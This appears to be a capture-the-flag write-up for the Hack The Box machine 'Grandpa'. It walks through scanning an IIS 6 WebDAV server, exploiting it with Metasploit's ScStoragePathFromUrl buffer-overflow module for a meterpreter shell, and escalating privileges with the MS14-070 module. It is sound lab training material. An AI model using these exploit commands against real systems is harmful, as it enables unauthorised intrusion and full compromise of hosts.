# Grandpa

## Nmap scan

```sh
sudo nmap -A -T5 -p- 10.10.10.14
```

results:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 01:19 EDT
Nmap scan report for 10.10.10.14
Host is up (0.20s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Sun, 12 Apr 2020 05:24:43 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows Server 2008 Enterprise SP2 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2003 SP2 (89%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows 2000 SP4 (85%), Microsoft Windows XP SP2 or Windows Server 2003 SP2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   199.82 ms 10.10.14.1
2   199.97 ms 10.10.10.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 232.57 seconds
```

From this, we see that there is a webDAV server running on port 80. Let's see if there are any exploits for this. While we are looking for exploits on WebDAV, let's also run `gobuster` on this server

## Gobuster

```sh
gobuster dir -u 10.10.10.14 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
## WebDAV

### Metasploit

```sh
msfconsole
use auxiliary/scanner/http/webdav_scanner
set RHOSTS 10.10.10.14
run

[+] 10.10.10.14 (Microsoft-IIS/6.0) has WEBDAV ENABLED
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

From the looks of it, the server does indeed have webDAV enabled. And we also know a key information, that it's running `IIS-6`.

Let's test the DAV server out with `davtest`

### Davtest

```sh
davtest --url 10.10.10.14
```

And seems like we get denied all PUT requests on the DAV server for remote code execution.

### Metasploit WebDAV exploit

Looking around for the error message on the webpage, we see that there's a windows IIS 6 webdav server running. Looking in rapid7 for an exploit, it results us with a buffer overflow exploit that existed back in 2018.

```sh
msfconsole
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set rhosts 10.10.10.14
run
# meterpreter shell is spawned
```

Let's migrate to another process since this meterpreter shell is very unstable

```sh
ps
migrate 2496
```

### Priv esc

```sh
sysinfo # inside meterpreter
```

Now copy and past the sysinfo file into a file called `sysinfo.txt` on own computer.
Now use `windows-exploit-suggester.py`

```sh
windows-exploit-suggester.py -d 2020-04-10-mssb.xls -i systeminfo.txt
```

We will try MS-14-070

```sh
background # background the meterpreter session
# Using the rapid7 doc for MS14-070 exploit
use exploit/windows/local/ms14_070_tcpip_ioctl
set SESSION <meterpreter session id>
exploit
```

and the flags are in the folder called `documents and settings`